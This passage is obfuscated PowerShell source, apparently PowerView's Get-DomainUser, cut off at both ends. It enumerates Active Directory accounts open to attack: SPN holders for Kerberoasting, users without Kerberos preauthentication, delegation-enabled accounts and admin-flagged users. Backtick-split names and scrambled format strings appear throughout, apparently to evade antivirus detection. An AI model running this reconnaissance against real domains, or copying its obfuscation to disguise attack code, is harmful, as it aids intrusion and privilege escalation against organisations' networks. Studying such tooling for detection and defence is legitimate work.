                    ${O`UT}."Ps`ObJ`ecT"."tYpen`AM`ES".("{1}{0}{2}"-f'ser','In','t').Invoke(0, ("{3}{1}{5}{2}{4}{0}"-f 'er','ew.','yOutl','PowerVi','i','Propert'))
                    ${O`Ut}
                }
            }
        }
    }
}








function g`ET-DoMA`INUSeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{7}{8}{5}{0}{3}{2}{1}{4}{6}{9}"-f 'e','Than','rsMore','dVa','Ass','UseDeclar','ignm','P','S','ents'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}"-f'ss','dProce','PSShoul'}, '')]
    [OutputType({"{1}{2}{0}{3}" -f'ew','PowerV','i','.User'})]
    [OutputType({"{4}{3}{1}{0}{2}" -f 'w.User.','Vie','Raw','ower','P'})]
    [CmdletBinding(deFAULtPARAMEteRSEtNamE = {"{0}{1}" -f'Enab','led'})]
    Param(
        [Parameter(posITioN = 0, vAluEfROmPIpeLINE = ${t`RUE}, valUEfrompIpeLinEByPRopERtYnaME = ${tr`UE})]
        [Alias({"{1}{2}{0}{3}" -f 'ish','Di','stingu','edName'}, {"{0}{3}{2}{1}" -f 'SamAcc','me','untNa','o'}, {"{0}{1}" -f'Nam','e'}, {"{1}{3}{5}{4}{2}{0}"-f'uishedName','M','Disting','e','r','mbe'}, {"{2}{1}{0}"-f 'rName','embe','M'})]
        [String[]]
        ${i`Den`TItY},

        [Switch]
        ${s`Pn},

        [Switch]
        ${aDmi`N`Cou`NT},

        [Parameter(PARaMETERSEtnAmE = "e`NAB`LED")]
        [Switch]
        ${e`NA`Bled},

        [Parameter(PARAMeteRsEtnAME = "DISA`B`led")]
        [Switch]
        ${Di`sa`BL`ed},

        [Switch]
        ${lo`c`KED},

        [Switch]
        ${UNlO`ck`Ed},

        [Switch]
        ${PASs`E`X`piREd},

        [Switch]
        ${paSsnotEXP`I`REd},

        [Switch]
        ${A`lLoW`DElEGaTiON},

        [Switch]
        ${D`ISALl`OWDElE`ga`T`ION},

        [Switch]
        ${N`o`pas`seXPirY},

        [Switch]
        ${Un`CO`NS`Trai`NeD},

        [Switch]
        ${T`RUSTedt`oauTh},

        [Switch]
        ${R`Bcd},

        [Alias({"{3}{4}{2}{1}{5}{0}"-f 'hNotRequired','o','er','Ke','rb','sPreaut'}, {"{0}{1}{2}" -f 'NoP','r','eauth'})]
        [Switch]
        ${PR`eaUT`h`NOTReQuIReD},

        [Switch]
        ${PA`SSN`Otr`eQUiRED},

        [ValidateRange(1, 10000)]
        [Int]
        ${PAsS`las`T`SET},

        [Switch]
        ${OW`Ner},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`mAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'er','Filt'})]
        [String]
        ${LdA`Pf`ILT`Er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Prope`RT`Ies},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'ADS','Path'})]
        [String]
        ${seA`RC`hB`ASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{4}{1}{0}{3}"-f 'Control','n','Dom','ler','ai'})]
        [String]
        ${S`Er`Ver},

        [ValidateSet({"{1}{0}"-f'se','Ba'}, {"{2}{1}{0}" -f 'el','v','OneLe'}, {"{2}{0}{1}" -f 'e','e','Subtr'})]
        [String]
        ${s`EARcHScO`PE} = ("{2}{0}{1}"-f'u','btree','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rEsU`LT`pA`GESIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sErv`ertI`mEL`iMIt},

        [ValidateSet({"{1}{0}"-f'cl','Da'}, {"{0}{1}" -f'G','roup'}, {"{1}{0}" -f 'one','N'}, {"{1}{0}"-f 'wner','O'}, {"{0}{1}"-f 'Sa','cl'})]
        [String]
        ${sEcu`RiTy`ma`sks},

        [Switch]
        ${TO`mBsT`o`NE},

        [Alias({"{0}{1}{2}" -f 'Retur','n','One'})]
        [Switch]
        ${FIndO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RED`EnTI`AL} =   ${7tQ02}::"EMp`TY",

        [Switch]
        ${r`AW},

        [Switch]
        ${s`SL},

        [Switch]
        ${ob`FusC`A`Te}
    )

    DynamicParam {
        ${Ua`CV`ALueNA`mES} =   ${g`604}::("{1}{2}{0}"-f'Names','Ge','t').Invoke(${U`Acenum})
        
        ${uACv`AluENAm`eS} = ${uacv`ALUEn`A`M`es} | &("{3}{2}{1}{0}" -f'ect','j','-Ob','ForEach') {${_}; "NOT_$_"}
        
        &("{4}{2}{5}{1}{0}{3}"-f'amicParamet','yn','w','er','Ne','-D') -Name ("{2}{0}{1}" -f 'ACFil','ter','U') -ValidateSet ${uacvaLU`e`N`AMEs} -Type ([array])
    }

    BEGIN {
        ${SEaRcheR`ARg`UmE`N`TS} = @{}
        if (${P`SBOUNDPaR`A`met`ers}[("{0}{1}"-f'Dom','ain')]) { ${seARc`HeRa`Rg`U`MENTS}[("{1}{0}" -f'main','Do')] = ${do`mA`in} }
        if (${p`SbOun`DpaRA`mEt`ERS}[("{2}{0}{1}"-f'rope','rties','P')]) { ${s`E`ARcheR`Ar`GuMEnTs}[("{1}{2}{0}" -f 'ies','Pr','opert')] = ${p`R`o`pertIeS} }
        if (${psbOUn`D`paRAm`eT`erS}[("{0}{1}" -f'Own','er')]) { ${SE`ARCHERA`RGUmE`NTS}[("{3}{2}{0}{1}"-f'e','s','rti','Prope')] = '*' }
        if (${PsbOUn`dp`AR`AM`ETeRs}[("{0}{1}{2}" -f'Searc','hB','ase')]) { ${SEArCh`Er`AR`GUmEn`Ts}[("{3}{1}{2}{0}" -f'ase','a','rchB','Se')] = ${S`ea`Rchbase} }
        if (${PS`B`ouNDparaME`TERS}[("{0}{1}" -f'S','erver')]) { ${Se`ARChE`Ra`RGuments}[("{1}{0}"-f 'erver','S')] = ${SeR`V`er} }
        if (${PS`BoUnD`P`ArAmEt`erS}[("{2}{1}{3}{0}" -f 'cope','ear','S','chS')]) { ${SEArch`ERA`R`gu`mentS}[("{1}{2}{0}" -f'hScope','Sear','c')] = ${s`earcHSC`o`pe} }
        if (${PSBo`UNd`p`A`RA`mETeRS}[("{0}{1}{3}{4}{2}" -f'Re','s','ze','ultPa','geSi')]) { ${sEArCh`ErAr`GU`MeNTs}[("{2}{1}{0}{3}{4}" -f'geS','a','ResultP','iz','e')] = ${RE`suLTPAgeS`Ize} }
        if (${pS`BO`UNDPA`R`Am`EteRs}[("{2}{0}{1}{3}" -f'erverTim','eL','S','imit')]) { ${S`eArC`HEr`ARgumENtS}[("{4}{3}{0}{2}{1}"-f'erT','t','imeLimi','v','Ser')] = ${s`erVer`TIM`E`limIT} }
        if (${ps`B`OU`N`dparaMET`ERS}[("{0}{2}{1}" -f'Securi','ks','tyMas')]) { ${Sea`RChERArg`U`me`Nts}[("{2}{1}{0}{3}"-f'rit','cu','Se','yMasks')] = ${SE`cUr`It`YMAskS} }
        if (${pSbouN`DP`ARaMeTe`RS}[("{1}{0}"-f 'r','Owne')]) { ${seAR`C`HERA`R`gUM`ENTS}[("{0}{1}{2}"-f'Secu','rityM','asks')] = ("{0}{1}" -f'O','wner') }
        if (${Ps`BOuNDPA`Ram`eTe`Rs}[("{1}{2}{0}{3}"-f 'on','Tombs','t','e')]) { ${sEA`Rch`Er`A`Rg`UMeNtS}[("{0}{2}{3}{1}" -f 'To','tone','mb','s')] = ${to`Mb`s`ToNe} }
        if (${P`sB`OUnDP`ARamET`eRS}[("{0}{2}{1}"-f'Cre','ential','d')]) { ${SEa`RchEra`Rg`Um`entS}[("{2}{0}{1}" -f'den','tial','Cre')] = ${c`Red`Enti`AL} }
        if (${P`SBoundpar`A`meters}['SSL']) { ${Se`A`RcHERaRgUm`EN`Ts}['SSL'] = ${S`sL} }
        if (${PSb`O`UndP`AR`AmETErs}[("{0}{1}{2}"-f'Ob','fusc','ate')]) {${Se`AR`ch`eR`ARguM`enTs}[("{1}{0}{2}"-f 'sca','Obfu','te')] = ${OB`FUScA`Te} }

        ${po`l`iCyAR`gUMEnTS} = @{}
        if (${Psb`OUND`P`AR`AM`EteRs}[("{0}{1}"-f 'D','omain')]) { ${pOlIcy`A`Rg`UM`enTS}[("{0}{1}"-f 'Dom','ain')] = ${Do`main} }
        if (${psB`OU`NdPaRAMetE`RS}[("{0}{1}"-f'Ser','ver')]) { ${polI`C`YAr`Gu`MentS}[("{1}{2}{0}" -f 'r','S','erve')] = ${s`Er`VEr} }
        if (${p`SbO`U`NdpaRa`m`etERS}[("{1}{3}{0}{2}"-f 'T','Se','imeLimit','rver')]) { ${PO`lIcYarg`U`MENTs}[("{0}{1}{2}"-f 'Server','TimeLim','it')] = ${SeR`V`erTiM`E`LImiT} }
        if (${PSB`oUNdParaMe`T`eRS}[("{2}{1}{0}" -f 'ential','d','Cre')]) { ${pol`iC`yAr`g`UmeNTS}[("{1}{0}{2}"-f'nti','Crede','al')] = ${CrEdE`NT`i`AL} }
    }

    PROCESS {
        
        if (${psboU`NdPa`RAMet`eRs} -and (${PSBo`UN`dpara`me`Te`RS}."co`Unt" -ne 0)) {
            &("{2}{5}{1}{0}{6}{4}{3}" -f'yna','-D','N','r','icParamete','ew','m') -CreateVariables -BoundParameters ${PSB`o`UNDpA`Ra`meTErs}
        }

        ${i`deNtit`Y`Fi`LtER} = ''
        ${Fil`Ter} = ''
        ${m`Axi`m`UmaGE} = ${n`Ull}
        ${IdE`N`TITy} | &("{0}{2}{1}{3}" -f'Wh','c','ere-Obje','t') {${_}} | &("{2}{1}{0}{3}" -f'Objec','Each-','For','t') {
            ${IDeNtiT`yi`N`StANCe} = ${_}.("{1}{0}{2}"-f'epla','R','ce').Invoke('(', '\28').("{0}{1}{2}"-f'Re','plac','e').Invoke(')', '\29')
            if (${iDe`NtI`Tyi`Ns`TaNce} -match ("{0}{1}"-f'^S','-1-')) {
                ${i`DeNtItYfi`lt`eR} += "(objectsid=$IdentityInstance)"
            }
            elseif (${I`dEnT`ITyiNs`TA`NCe} -match ("{1}{0}"-f'CN=','^')) {
                ${I`dENtI`T`yFILtEr} += "(distinguishedname=$IdentityInstance)"
                if ((-not ${PSbOuNdpAR`A`m`ETE`RS}[("{2}{0}{1}" -f 'o','main','D')]) -and (-not ${psBOu`NDPA`RaMe`TerS}[("{1}{2}{0}"-f'se','Se','archBa')])) {
                    
                    
                    ${IdeN`TITyD`oM`Ain} = ${IdE`NTITYI`N`stAN`CE}.("{1}{2}{0}"-f'tring','S','ubS').Invoke(${IDENt`it`yIn`StaN`ce}.("{1}{0}"-f 'xOf','Inde').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                    &("{2}{0}{1}" -f'-','Verbose','Write') ('['+'Get'+'-Doma'+'inU'+'ser] '+'Extr'+'act'+'ed '+'d'+'omai'+'n '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                    ${sea`RcHe`R`ARgUmeN`Ts}[("{1}{0}" -f 'n','Domai')] = ${ideNtIty`dOm`AIN}
                }
            }
            elseif (${Ide`NtitYinsT`A`N`ce} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                ${gUiDByTES`TR`i`NG} = (([Guid]${id`ENt`Ityi`NS`T`ANce}).("{0}{2}{1}"-f'ToByteA','ay','rr').Invoke() | &("{2}{4}{1}{3}{0}"-f 't','h-Ob','Fo','jec','rEac') { '\' + ${_}.("{1}{0}"-f'String','To').Invoke('X2') }) -join ''
                ${I`deNT`ItYfIl`T`er} += "(objectguid=$GuidByteString)"
            }
            elseif (${i`dEnT`ITyi`NSTANce}.("{0}{1}{2}" -f'Co','n','tains').Invoke('\')) {
                ${CONv`Er`Te`DIdEntit`yiNstANce} = ${id`eN`TItyiNS`TaNcE}.("{1}{2}{0}" -f'lace','Re','p').Invoke('\28', '(').("{0}{1}" -f'Rep','lace').Invoke('\29', ')') | &("{1}{2}{0}" -f'ame','Convert-','ADN') -OutputType ("{2}{1}{0}"-f 'onical','n','Ca')
                if (${CONV`ER`TEDiD`E`Nt`IT`YinsTAnCe}) {
                    ${uSE`RDO`main} = ${C`oN`VeRT`EdiDeNT`i`TYin`St`ANcE}.("{0}{1}{2}"-f'S','ubSt','ring').Invoke(0, ${CONvE`Rt`eD`Id`enT`i`TyiNS`TaNce}.("{2}{0}{1}" -f 'e','xOf','Ind').Invoke('/'))
                    ${uSERNA`ME} = ${iDeNtITYIn`ST`AN`ce}.("{1}{0}"-f'lit','Sp').Invoke('\')[1]
                    ${I`d`ENt`iTyFILT`ER} += "(samAccountName=$UserName)"
                    ${sE`ArcheR`ARg`U`me`NTs}[("{2}{0}{1}" -f'm','ain','Do')] = ${us`erDOM`A`in}
                    &("{3}{1}{0}{2}{4}"-f '-Ve','ite','r','Wr','bose') ('[Get-Domain'+'U'+'ser]'+' '+'E'+'xtr'+'acted'+' '+'dom'+'ain '+"'$UserDomain' "+'fro'+'m '+"'$IdentityInstance'")
                }
            }
            else {
                ${IDEnt`it`yf`i`lTeR} += "(samAccountName=$IdentityInstance)"
            }
        }

        if (${i`dEN`TIT`YfIL`TeR} -and (${IDeNt`ityFi`LtER}.("{0}{1}"-f 'Tr','im').Invoke() -ne '') ) {
            ${f`IltER} += "(|$IdentityFilter)"
        }

        if (${PsbO`UNDp`AR`AMeters}['SPN']) {
            &("{1}{2}{3}{0}"-f 'se','Writ','e','-Verbo') ("{7}{2}{5}{6}{9}{1}{13}{4}{14}{11}{0}{12}{8}{3}{10}" -f 'e p','nU','D',' na','] Searchin','o','m','[Get-','cipal','ai','mes','-null servic','rin','ser','g for non')
            ${f`IltEr} += (("{2}{3}{4}{5}{0}{1}"-f '*',')','(se','rviceP','rincipal','Name='))
        }
        if (${Psb`ounDPA`Ramet`eRs}[("{2}{1}{0}"-f'd','ble','Ena')]) {
            &("{0}{2}{1}" -f 'Wr','se','ite-Verbo') ("{11}{9}{12}{8}{15}{3}{5}{13}{6}{10}{14}{1}{4}{7}{2}{0}"-f'led','e','b','ching','n',' f','ers who','a','Use','Dom',' are','[Get-','ain','or us',' ','r] Sear')
            
            ${f`i`lTEr} += ("{1}{11}{7}{4}{0}{8}{3}{9}{12}{5}{6}{2}{10}" -f't','(!(u','3:','.2','coun','0.113556.1.4','.80','c','Control:1','.','=2))','serA','84')
        }
        if (${pSBoU`NdpaR`A`m`ETERs}[("{2}{0}{1}"-f 'sabl','ed','Di')]) {
            &("{1}{2}{0}{3}" -f 'bo','Wri','te-Ver','se') ("{1}{0}{6}{3}{5}{7}{8}{2}{4}"-f 'Do','[Get-','i','inUs','sabled','er','ma','] Sear','ching for users who are d')
            
            ${F`i`lTER} += ("{0}{8}{2}{3}{1}{7}{6}{5}{4}" -f '(userAcco','.840.1135','ontrol:','1.2','03:=2)','8','.1.4.','56','untC')
        }
        if (${pS`BOuN`dPAr`A`MEte`RS}[("{0}{1}"-f 'Locke','d')]) {
            &("{3}{0}{1}{2}"-f 'e','r','bose','Write-V') ("{9}{2}{7}{0}{10}{8}{6}{3}{5}{1}{4}" -f'ainUser] Sea',' l','t-Do',' who ar','ocked','e','sers','m','for u','[Ge','rching ')
            
            ${dUrA`TI`on} = ((&("{4}{3}{2}{0}{1}" -f 'ainPo','licy','om','D','Get-') -Policy ("{0}{1}"-f 'D','omain') @PolicyArguments)."sYs`TEMACC`ess")."LoCkou`TDu`R`AtIon"
            if (${Du`R`ATiOn} -eq -1) {
                ${locKO`UTTI`ME} = 1
            }
            else {
                ${l`OC`kOUT`Time} = (&("{2}{0}{1}"-f '-Da','te','Get')).("{2}{1}{0}" -f 'Minutes','dd','A').Invoke(-${d`Ura`TIon}).("{1}{3}{2}{0}" -f'eTimeUtc','T','il','oF').Invoke()
            }
            ${F`i`lteR} += "(lockoutTime>=$LockoutTime)"
        }
        elseif (${PS`BOUNd`Par`AMetERs}[("{1}{0}"-f 'd','Unlocke')]) {
            &("{0}{1}{2}"-f 'Write-V','erbo','se') ("{8}{10}{6}{5}{3}{4}{9}{0}{2}{11}{7}{1}" -f ' user','ked','s who are','Searc','h','nUser] ','omai','nloc','[','ing for','Get-D',' u')
            
            ${DUr`Ati`on} = ((&("{3}{0}{2}{1}" -f'-Domai','olicy','nP','Get') -Policy ("{1}{2}{0}" -f 'ain','Do','m') @PolicyArguments)."Sy`ST`emACce`Ss")."l`ockOUTDuRat`I`oN"
            if (${DUR`ATI`ON} -eq -1) {
                ${lOcKO`Utt`iMe} = 1
            }
            else {
                ${l`O`ck`OUTtime} = (&("{0}{1}"-f 'Get-','Date')).("{1}{2}{0}" -f 's','AddM','inute').Invoke(-${dUr`A`TIoN}).("{0}{1}{2}"-f'T','oFileTime','Utc').Invoke()
            }
            ${FIL`T`eR} += "(!(lockoutTime>=$LockoutTime))"
        }
        if (${pSBO`Un`d`p`ArametERs}[("{1}{0}{2}"-f 'xpir','PassE','ed')]) {
            &("{0}{3}{1}{2}"-f'Wri','Verbos','e','te-') ("{16}{18}{13}{8}{5}{17}{3}{0}{11}{12}{19}{14}{2}{6}{9}{7}{1}{4}{10}{15}" -f 'r','to n','ssw','no','e','er] I','or','s ','Us','d','v','ing us','ers that ','-Domain','ve pa','er expire','[Ge','g','t','ha')
            ${fi`l`TER} += ((("{10}{4}{0}{8}{9}{2}{11}{12}{13}{6}{3}{7}{1}{5}" -f 'cco','556.1.4.803:=65536)','t','0.1','userA',')','84','13','u','n','(!(','Control:1','.','2.')))
            &("{2}{0}{1}" -f'-V','erbose','Write') ("{4}{5}{16}{0}{10}{3}{17}{13}{6}{2}{9}{14}{7}{11}{1}{8}{18}{12}{15}" -f 'ser] Gett','e fr','a','g t','[','Get','m',' password','om','xim','in',' ag','olic','e ','um','y','-DomainU','h',' the domain p')
            ${MA`xIm`UmAgE} = [Int]((&("{3}{0}{2}{4}{1}"-f'Do','Policy','mai','Get-','n') -Policy ("{1}{0}"-f'in','Doma') @PolicyArguments)."sYS`T`emaC`CeSS")."m`A`XIMumP`ASswOrdAge"
            if (${mAXImuM`A`GE} -lt 1) {
                &("{0}{3}{1}{4}{2}"-f'Wr','te','ng','i','-Warni') ("{0}{1}{3}{15}{2}{16}{12}{6}{13}{18}{4}{10}{17}{14}{8}{9}{7}{5}{11}"-f '[Get-Dom','ain','sab','User] Password ','oli','e','in d','urn','l','l be ret','c','d',' ','o','o users wi','expiry di','led','y, n','main p')
                return
            }
        }
        elseif (${psb`o`UN`DpAra`mEte`Rs}[("{2}{1}{0}"-f 'xpiry','PassE','No')]) {
            &("{2}{3}{1}{0}"-f'ose','b','Write-','Ver') ("{11}{0}{8}{7}{13}{5}{3}{1}{6}{10}{12}{4}{9}{2}" -f'D','se','never expire','ing for u','ss','] Search','rs wh','U','omain','words ','ose p','[Get-','a','ser')
            ${fIl`T`Er} += ("{9}{4}{3}{0}{5}{6}{10}{12}{8}{2}{7}{1}{11}"-f 'Ac',':','.840.11','r','se','count','Cont','3556.1.4.803','.2','(u','ro','=65536)','l:1')
        }
        if (${P`SBOuNDPaR`AM`eTe`Rs}[("{0}{4}{3}{2}{1}"-f'P','ed','ir','tExp','assNo')]) {
            &("{2}{1}{0}" -f 'ose','rite-Verb','W') ("{6}{5}{4}{7}{10}{1}{3}{11}{9}{0}{2}{8}" -f 'dom','aximum','ain po',' pas','] ','et-DomainUser','[G','Getting','licy',' from the ',' the m','sword age')
            ${m`AX`iM`UMaGe} = [Int]((&("{3}{2}{1}{0}" -f 'nPolicy','ai','t-Dom','Ge') -Policy ("{0}{1}" -f 'Doma','in') @PolicyArguments)."Sy`sTeMAcc`Ess")."MA`XImu`MPaS`sWOrDAgE"
        }
        if (${P`sb`oundPAr`AMETE`RS}[("{2}{3}{0}{4}{1}"-f 'lowD','tion','A','l','elega')]) {
            &("{3}{0}{2}{1}"-f'-Ve','e','rbos','Write') ("{5}{9}{0}{7}{11}{14}{1}{3}{13}{12}{8}{10}{4}{2}{6}"-f'inUser','e','at','rs wh',' deleg','[Get-Do','ed','] ','n','ma',' be','Searching for u',' ca','o','s')
            
            ${f`IlTEr} += (("{3}{7}{5}{2}{6}{9}{1}{4}{0}{8}" -f'48576)','1.2.840.113556','ntC','(','.1.4.803:=10','Accou','ont','!(user',')','rol:'))
        }
        elseif (${p`SB`OUND`pAR`AmeT`eRS}[("{2}{1}{0}{3}" -f 'allo','is','D','wDelegation')]) {
            &("{2}{1}{0}" -f 'bose','-Ver','Write') ("{1}{11}{4}{5}{3}{6}{13}{7}{8}{9}{2}{12}{0}{14}{10}"-f 'e','[G',' d','ers','t-DomainUser] ','Searching for us',' who','ensitive an','d not trusted',' for','n','e','el',' are s','gatio')
            ${fil`TEr} += ("{6}{0}{13}{8}{10}{14}{11}{9}{1}{7}{3}{5}{2}{4}{12}"-f 'serAcc','.1','=','556.1.4.80','1048','3:','(u','13','tro','840','l:1','.','576)','ountCon','.2')
        }
        if (${PSboUnDp`AR`A`METerS}[("{0}{2}{1}{3}"-f 'U','ns','nco','trained')]) {
            &("{1}{2}{0}"-f 'bose','Write-','Ver') ("{18}{20}{10}{16}{13}{5}{12}{3}{15}{19}{7}{2}{1}{9}{4}{8}{14}{17}{6}{21}{11}{0}"-f 'ion','se','u',' ',' con','r] S','de','r ','figured for uncon','rs','omainU','t','earching','e','s','f','s','trained ','[Get-','o','D','lega')
            ${fI`Lt`Er} += (("{8}{0}{3}{6}{1}{7}{4}{2}{5}" -f'rAc','tControl:1.2.8','8','co','.803:=5242','8)','un','40.113556.1.4','(use'))
        }
        if (${ps`BOu`NdPaRAm`E`TeRs}[("{0}{2}{1}" -f'Adm','ount','inC')]) {
            &("{2}{0}{1}" -f'r','bose','Write-Ve') ("{6}{7}{9}{5}{0}{2}{3}{4}{1}{8}{10}"-f'er] ','or adminCoun','S','ea','rching f','ainUs','[G','et-Do','t=','m','1')
            ${Fil`TER} += ("{0}{1}{2}{3}" -f '(','adminc','ount','=1)')
        }
        if (${PSB`oUNd`P`A`RAm`EtErs}[("{2}{1}{0}"-f 'ToAuth','d','Truste')]) {
            &("{1}{0}{2}" -f '-Verb','Write','ose') ("{25}{0}{26}{12}{17}{5}{18}{8}{9}{10}{3}{22}{11}{19}{6}{20}{14}{15}{16}{2}{13}{7}{1}{21}{24}{23}{4}"-f'G','e','n','fo','pals','User] ',' are ','icat','ea','rc','hing ','th','t-Domai','t','ed',' to auth','e','n','S','at','trust',' for other','r users ','inci',' pr','[','e')
            ${fI`L`TeR} += (("{3}{1}{4}{2}{0}"-f 'o=*)','lowe','et','(msds-al','dtodelegat'))
        }
        if (${psBo`U`NDPA`RaMeTErs}[("{1}{0}"-f'D','RBC')]) {
            &("{2}{0}{1}" -f 'ite-Verb','ose','Wr') ("{14}{19}{7}{20}{0}{6}{15}{1}{4}{16}{9}{3}{21}{10}{17}{18}{2}{12}{11}{5}{13}{8}" -f 'Sea','ng for users tha','ai','to ','t are','del','rc','Doma','tion','ed ','llow r',' ','ned','ega','[Ge','hi',' configur','esource-','based constr','t-','inUser] ','a')
            ${Fi`l`Ter} += ("{6}{7}{3}{4}{0}{10}{11}{2}{12}{1}{5}{9}{8}"-f'l','of','ac','ds','-a','othe','(','ms','=*)','ridentity','l','owedto','tonbehalf')
        }
        if (${pSBO`UNdp`ARa`MeTerS}[("{3}{0}{4}{1}{2}"-f'ea','thNotRequire','d','Pr','u')]) {
            &("{1}{0}{3}{2}"-f 'i','Wr','ose','te-Verb') ("{2}{8}{7}{5}{0}{3}{12}{1}{13}{4}{11}{9}{6}{10}" -f 'ch','ac','[Get-D','ing for user','o ',' Sear','kerber',']','omainUser','ire ','os preauthenticate','not requ',' ','counts that d')
            ${f`ilT`ER} += (("{3}{4}{5}{7}{1}{2}{8}{6}{0}" -f'4194304)','13556','.','(userAccountContro','l:1.2','.','3:=','840.1','1.4.80'))
        }
        if (${pS`BOUNdPar`Am`e`TE`Rs}[("{2}{3}{0}{1}" -f'equir','ed','Pas','sNotR')]) {
            &("{3}{0}{2}{1}"-f'ite-V','ose','erb','Wr') ("{7}{11}{0}{15}{2}{12}{1}{8}{6}{10}{14}{4}{5}{3}{13}{9}"-f 'omainU','o','ng ','_NOTR','s that hav','e PASSWD',' accou','[Get-','r user','D set','n','D','f','EQ','t','ser] Searchi')
            ${FI`l`TeR} += ("{4}{1}{0}{5}{7}{2}{6}{3}{8}" -f 'ou','userAcc','1.2.840','355','(','ntContr','.11','ol:','6.1.4.803:=32)')
        }
        if (${pSB`OuNDP`Ara`mE`T`eRS}[("{0}{2}{1}" -f 'Pass','stSet','La')]) {
            &("{3}{0}{2}{1}"-f'te-Ve','se','rbo','Wri') ('[Get-Doma'+'inUs'+'e'+'r'+'] '+'S'+'ea'+'rching'+' '+'for'+' '+'u'+'ser '+'acc'+'ou'+'nts '+'th'+'at '+'ha'+'ve '+'n'+'ot '+'h'+'ad '+'a '+'pas'+'swor'+'d '+'cha'+'ng'+'e '+'for'+' '+'a'+'t '+'leas'+'t '+"$PSBoundParameters['PassLastSet'] "+'da'+'ys')
            ${pw`Dd`AtE} = (&("{1}{0}"-f 't-Date','Ge'))."aDd`d`Ays"(-${p`sBO`UNDpA`RaMET`e`Rs}[("{0}{1}{2}" -f'Pa','ssLastS','et')]).("{1}{2}{0}{3}" -f 'ile','To','F','Time').Invoke()
            ${fIlt`eR} += "(pwdlastset<=$PwdDate)"
        }

        if (${p`s`B`ouNdp`AR`AmEtERs}[("{0}{2}{1}"-f 'L','ter','DAPFil')]) {
            &("{3}{0}{2}{1}" -f 'e-','rbose','Ve','Writ') ('['+'G'+'et-Domain'+'User] '+'Using'+' '+'a'+'ddi'+'tional '+'LD'+'AP '+'fil'+'t'+'er: '+"$LDAPFilter")
            ${fil`T`ER} += "$LDAPFilter"
        }

        
        ${Uac`FILt`eR} | &("{2}{1}{3}{0}"-f'ct','-Ob','Where','je') {${_}} | &("{1}{2}{0}{3}" -f'Objec','ForEach','-','t') {
            if (${_} -match ("{1}{0}" -f'.*','NOT_')) {
                ${uA`cf`ieLD} = ${_}.("{1}{0}{2}"-f 'ubstri','S','ng').Invoke(4)
                ${uAc`VA`LUe} = [Int](${uA`ce`NUM}::${Uac`F`IElD})
                ${FI`L`TER} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
            }
            else {
                ${UAc`V`ALuE} = [Int](${UaCe`NUm}::${_})
                ${F`ILteR} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
            }
        }

        &("{2}{3}{0}{1}"-f'erbo','se','Wr','ite-V') ('['+'Get-DomainUs'+'er]'+' '+'f'+'ilter '+'st'+'ring:'+' '+"(&(samAccountType=805306368)$Filter")

        ${R`Es`ULtS} = &("{2}{1}{3}{0}"-f'y','nvoke','I','-LDAPQuer') @SearcherArguments -LDAPFilter "(&(samAccountType=805306368)$Filter)"

        ${re`SULtS} | &("{2}{0}{1}" -f 're','-Object','Whe') {${_}} | &("{2}{1}{0}" -f '-Object','Each','For') {
            if (&("{1}{2}{3}{0}" -f 'er','Get-','M','emb') -inputobject ${_} -name ("{0}{2}{1}"-f'A','utes','ttrib') -Membertype ("{1}{2}{0}" -f'ies','P','ropert')) {
                ${Pr`OP} = @{}
                foreach (${a} in ${_}."ATt`R`IbutES"."k`eyS" | &("{1}{0}{2}" -f'rt-O','So','bject')) {
                    if ((${A} -eq ("{1}{0}{2}" -f 'ts','objec','id')) -or (${A} -eq ("{1}{2}{0}" -f'y','sidhisto','r')) -or (${a} -eq ("{1}{0}{2}"-f 'jectgu','ob','id')) -or (${a} -eq ("{2}{1}{0}{4}{3}" -f'ertifi','erc','us','e','cat')) -or (${A} -eq ("{3}{5}{1}{2}{0}{4}"-f'escr','urity','d','n','iptor','tsec')) -or (${A} -eq ("{1}{0}{2}" -f'gon','lo','hours'))) {
                        ${pr`Op}[${a}] = ${_}."A`Tt`RIbut`es"[${a}]
                    }
                    else {
                        ${valU`Es} = @()
                        foreach (${v} in ${_}."At`TriBu`Tes"[${a}]."Ge`Tva`lUES"([byte[]])) {
                            ${Val`U`Es} +=   ${M`1Lc}::"uT`F8"."G`ETs`TrIng"(${V})
                        }
                        ${P`Rop}[${a}] = ${v`A`lUES}
                    }
                }
            }
            else {
                ${P`Rop} = ${_}."p`Ro`PER`TIes"
            }

            ${c`o`Nt`INUE} = ${Tr`UE}
            if (${Psbo`UnDpaRA`Me`TeRS}[("{1}{0}{2}" -f'ir','PassExp','ed')]) {
                if (${MA`Xim`UMaGE} -gt 0) {
                    ${Pwdl`AS`TSET} = ${pr`op}."p`w`dlaSTset"[0]
                    if (${pW`dLa`S`TSET} -eq 0) {
                        ${pw`Dl`AsTSet} = ${p`ROp}."whenc`ReA`TeD"[0]
                    }
                    ${ExpIR`E`TiMe} = (&("{0}{1}" -f 'G','et-Date')).("{2}{0}{1}"-f 'dDay','s','Ad').Invoke(-${MAX`IM`UM`AGe}).("{3}{2}{1}{0}"-f 'Utc','e','oFileTim','T').Invoke()
                    if (${PW`DlA`StseT} -gt ${eXpi`RET`i`mE}) {
                        ${CON`T`i`NUE} = ${fal`se}
                    }
                }
                else {
                    ${cON`Ti`Nue} = ${fAl`SE}
                }
            }
            elseif (${psbOu`N`dP`A`RAMET`ERS}[("{1}{2}{0}{4}{3}" -f'sNotEx','P','as','ed','pir')] -and ((${Pr`oP}."Use`RA`Cc`Ou`NT`conTRoL"[0] -band 65536) -ne 65536)) {
                if (${mA`X`IMum`AGe} -gt 0) {
                    ${Pwdl`Ast`set} = ${p`ROP}."p`w`DlAST`sEt"[0]
                    if (${pWDL`AstS`eT} -eq 0) {
                        ${P`w`d`LaSTSet} = ${P`ROp}."wHenC`R`EatEd"[0]
